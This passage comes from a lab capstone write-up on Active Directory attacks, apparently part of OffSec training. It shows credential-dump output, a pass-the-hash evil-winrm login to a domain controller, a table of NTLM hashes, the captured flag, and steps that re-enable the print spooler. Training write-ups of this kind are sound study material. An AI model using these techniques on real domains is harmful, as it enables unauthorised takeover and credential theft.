        kerberos :
         * Username : client75$
         * Domain   : CORP.COM
         * Password : 9d 1d a0 59 a1 29 6b 6c 1d 00 0a 0a 3b 2a a1 d5 3c d6 aa aa ef 97 dd 9e b6 ca da 3e 3f a8 98 3e ba b5 40 73 c0 75 19 46 0c 7b e4 dd 5b b5 e1 6b ae 9e bd 25 38 d7 50 9f 00 57 3b 97 9d 6c 37 1f 06 52 82 85 82 4a a7 d0 d1 8a dd b2 3b 7f 23 7d 70 51 80 7c d4 41 48 79 f4 e9 33 2f 3a f2 b5 51 e5 eb 1e 4d 89 29 db 64 bc 57 83 de 2d d3 d4 ea aa 88 26 24 e1 3e 73 11 71 26 d8 c5 53 e5 4c 4a 2f 8a 47 57 f6 2f 17 7c 96 33 31 f0 dd 46 dc 5a e2 e3 9c 52 37 c5 46 20 0c 6b 9b b4 2f c5 22 1a 3e fe 58 6b e1 6a 21 b2 f2 04 b1 e1 a0 fa 00 03 18 0f dd 72 92 f9 5e 6f 46 2b df 34 1b 90 be cf d7 d9 c2 dd 1f 9b e0 73 bd 42 e9 38 24 91 13 0e 48 bf 44 2b 0e 6f 61 71 08 37 35 eb 1d ba 36 5b c7 96 4f dc 0b 15 8c 66 57 41 19 b2 66 61 7d 57 
        ssp :
        credman :
        cloudap :       KO
```

* Entramos al DC:
```powershell
┌──(root㉿kali)-[/home/…/OffSec/23-ActiveDirectory-Attacks/Capstones/lab-1]
└─# evil-winrm -i 192.168.230.70 -u 'maria' -H "2a944a58d4ffa77137b2c587e6ed7626" -P 5985
                                        
*Evil-WinRM* PS C:\Users\maria\Documents> hostname
DC1
*Evil-WinRM* PS C:\Users\maria> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
    Directory: C:\Users\Administrator\Desktop                                                                                                                                                                     
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
Mode                 LastWriteTime         Length Name                                                                                                                                                            
----                 -------------         ------ ----                                                                                                                                                            
-a----          7/7/2025   8:23 AM             38 flag.txt                                                                                                                                                        
                                                                                                                                                                                                                  
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
OS{b84258d9ae9a6ac044a7968b823a858c}                                                                                                                                                                              
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```


#### Hashes:

|user | host | hash |
|-----|------|------|
|maria|      |2a944a58d4ffa77137b2c587e6ed7626| 
|dave |      |08d7a47a6f9f66b97b1bae4178747494| 
|offsec|     |2892d26cdf84d7a70e2eb3b9f05c425e|

## Troubleshooting
* Activando spooler
```powershell
*Evil-WinRM* PS C:\Users\mike> Get-WmiObject -Class Win32_Service -Filter "Name='spooler'" | Select-Object Name, StartMode, State, Status

Name    StartMode State   Status                                                                      
----    --------- -----   ------                                                                      
Spooler Disabled  Stopped OK                                                                          
                                                                                                      
                                                                                                      
*Evil-WinRM* PS C:\Users\mike> Set-Service -Name spooler -StartupType Automatic
*Evil-WinRM* PS C:\Users\mike> Start-Service -Name spooler
```
